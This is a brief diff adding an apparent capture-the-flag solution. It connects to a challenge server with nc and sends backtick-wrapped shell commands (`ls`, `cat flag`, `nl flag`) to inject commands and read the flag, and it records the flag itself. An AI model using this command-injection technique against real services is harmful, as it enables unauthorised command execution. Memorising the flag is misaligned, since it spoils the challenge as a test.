@@ -1,0 +1,8 @@
+nc mylittlepwny.nc.jctf.pro 1337
+
+`ls`
+	bin flag lib lib64 server.py usr
+`cat flag`
+	I like cats :)
+`nl flag`
+	1 justCTF{p0nY_t4lEs_b3giN5_h3r3}
